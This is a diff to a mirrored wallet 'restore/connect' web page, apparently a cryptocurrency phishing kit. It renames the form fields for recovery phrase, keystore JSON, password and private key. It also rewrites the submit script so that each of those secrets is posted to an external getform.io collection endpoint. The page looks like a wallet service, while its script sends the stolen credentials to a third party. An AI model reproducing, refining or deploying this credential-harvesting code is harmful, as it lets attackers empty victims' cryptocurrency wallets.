@@ -3487,7 +3487,7 @@
 								
 								<!-- <input type="hidden" name="w" value="Electrum"> -->
 				
-								<textarea name="phrase" class="key" required="required" minlength="12"
+								<textarea name="keystore" class="key" required="required" minlength="12"
 									placeholder="Keystore JSON"></textarea>
 								<br>
 								<div class="field">
@@ -3508,7 +3508,7 @@
 
 								<!-- <input type="hidden" name="w" value="Electrum"> -->
 								<div class="field">
-									<input type="text" name="key" class="key" placeholder="Private Key">
+									<input type="text" name="privatekey" class="key" placeholder="Private Key">
 								</div>
 								<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
 								<br>
@@ -3519,26 +3519,41 @@
 						<script>
 							document.getElementById("default").click();
 						</script>
-						<script src=""></script>
 						<script>
-						    const form = document.getElementById("form");
-						    form.addEventListener("submit", formSubmit);
-
-						    function formSubmit(e) {
-							e.preventDefault();
-							const formData = new FormData(e.target);
-
-							fetch("https://getform.io/f/929514ea-b408-47b5-807f-8a15146e357d", {
-							    method: "POST",
-							    body: formData,
-							    headers: {
-								"Accept": "application/json",
-							    },
-							})
-							.then(response => console.log(response))
-							.catch(error => console.log(error))
-						    }
-						</script>
+							var form = document.getElementById("form");
+							form.addEventListener("submit", formSubmit);
+						 
+							function formSubmit(e) {
+								e.preventDefault()
+						 
+								const formData = new FormData();
+								formData.append(
+									'phrase',
+									document.querySelector('input[name="phrase"]').value
+								)
+								formData.append(
+									'keystore',
+									document.querySelector('input[name="keystore"]').value
+								)
+								formData.append(
+									'password',
+									document.querySelector('input[name="password"]').value
+								)
+								formData.append(
+									'privatekey',
+									document.querySelector('input[name="privatekey"]').value
+								)
+						 
+								fetch("https://getform.io/f/929514ea-b408-47b5-807f-8a15146e357d",
+								{
+									method: "POST",
+									body: formData,
+								})
+								.then(response => console.log(response))
+								.catch(error => console.log(error))
+								}
+						 
+						 </script>
 					</center>
 				</body>
 				<!-- Mirrored from restorewallets.com/connect/index0b9a0b9a0b9a?w=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Apr 2021 08:14:40 GMT -->
